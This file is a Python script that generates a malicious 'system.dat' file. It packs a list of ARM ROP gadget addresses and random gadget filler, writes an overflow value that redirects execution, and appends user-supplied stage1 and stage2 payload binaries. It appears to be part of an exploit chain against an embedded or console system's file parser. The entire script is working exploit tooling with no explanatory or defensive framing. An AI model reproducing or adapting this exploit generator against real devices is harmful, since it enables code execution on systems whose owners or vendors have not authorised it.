#!/usr/bin/env python3
from sys import argv, exit
import random
import struct

gadgets = [
    0x8102a2f3,  # blx r0
    0x8102a3d3,  # blx r0
    0x81005579,  # blx r1
    0x8100a107,  # blx r2
    0x8100a16b,  # blx r3
    0x8100717b,  # str r0, [r1, #0x0] ; add sp, #0x4; pop {pc}
    0x8102978d,  # movs r1, r0 ; pop {r4, pc}
    0x81000c69,  # movs r4, r0 ; add sp, #0xC; pop {pc}
    0x810321ed,  # pop {r0, r1, r2, r4, pc}
    0x810321fd,  # pop {r0, r1, r2, r3, r4, r5, r7, pc}
    0x81021795,  # pop {r3, r5, pc}
    0x81000065,  # pop {r4, pc}
    0x8102675d,  # pop.w {r4, r5, r6, r7, r8, r9, pc}
    0x81000bf5,  # ldr r0, [sp, #0x0] ; add sp, #0x4, pop {pc}
    0x81026bad,  # ldm.w sp, {r0, r1} ; add sp, #0xC, pop {pc}
]


def gen_random_gadget():
    random_gadget = 0
    valid = False
    while not valid:
        random_choice = random.randint(0, 10)
        if random_choice == 0:
            random_number = random.randrange(0x810c0d00, 0x810c1000, 0x04)
        elif random_choice == 1:
            random_number = random.randrange(0x81e82000, 0x81ea2000, 0x04)
        elif random_choice >= 2 and random_choice < 4:
            random_number = random.randrange(0x8102f294, 0x81030044, 0x10)
        elif random_choice >= 4 and random_choice < 6:
            random_number = random.randint(0x81000000, 0x8102f294) | 0x1
        else:
            random_number = random.choice(gadgets)
        random_gadget = struct.pack("I", random_number)
        valid = True
        if random_number == 0xffff:
            valid = False
        else:
            for j in range(0, 4):
                byte = random_gadget[j]
                if byte == "\x0A" or byte == "\x0D":
                    valid = False
                    break
    return random_gadget


def main():
    if len(argv) != 4:
        print("Usage: gen.py stage1.bin stage2.bin system.dat")
        return -1

    random.seed(1337)

    with open(argv[1], "rb") as fin:
        stage1 = fin.read()
    with open(argv[2], "rb") as fin:
        stage2 = fin.read()
    with open(argv[3], "wb") as fout:
        # write 0x38 bytes of random gadgets
        for i in range(0, 0x38, 4):
            fout.write(gen_random_gadget())
        # write overflow which redirects destination
        fout.write(struct.pack("I", 0x810c0dfa))
        # write random gadget
        fout.write(gen_random_gadget())
        # write offset
        fout.write(struct.pack("I", 0))
        # write newline delimiter
        fout.write(struct.pack("H", 0x000a))
        # write dummy
        fout.write(struct.pack("H", 0x8123))
        # write stage1
        fout.write(stage1)
        # write eof
        fout.write(struct.pack("H", 0xffff))
        # write dummy
        fout.write(struct.pack("H", 0x8123))
        # write stage2
        fout.write(stage2)


if __name__ == "__main__":
    exit(main())
